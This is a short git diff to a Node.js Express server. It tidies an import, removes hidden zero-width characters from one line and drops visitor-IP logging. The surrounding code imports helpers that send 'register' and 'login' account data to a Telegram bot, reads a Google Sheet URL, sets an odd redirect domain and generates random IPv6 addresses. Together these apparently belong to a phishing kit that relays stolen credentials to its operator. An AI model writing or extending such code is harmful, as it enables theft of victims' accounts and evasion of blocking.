@@ -5,7 +5,6 @@ const PORT = process.env.PORT || 3001;
 const GOOGLE_SHEET_URL = process.env.GOOGLE_SHEET_URL;
 
 const { googleSheetApi } = require("./utils/api");
-const { ​​​​​​​​generateRandomIPv6WithPrefix } = require("./utils/genIp");
 const bodyParser = require("body-parser");
 const app = express();
 app.use(express.json());
@@ -19,6 +18,9 @@ const {
   sendRegisterAccountToBot,
   sendLoginAccountToBot,
 } = require("./utils/sendTelegram");
+const { generateRandomIPv6WithPrefix } = require("./utils/genIp");
+
+
 const TelegramBot = require("node-telegram-bot-api");
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
 let redirectDomain = "https://ggys5hav.net";
@@ -58,8 +60,6 @@ app.get("/", (req, res) => {
 });
 
 app.get('/Home/Index', (req, res) => {
-  let ip = req.ip;
-  console.log(ip);
   return res.render("desktop/index", {
     layout: "desktop/layout",
     redirectDomain: redirectDomain,
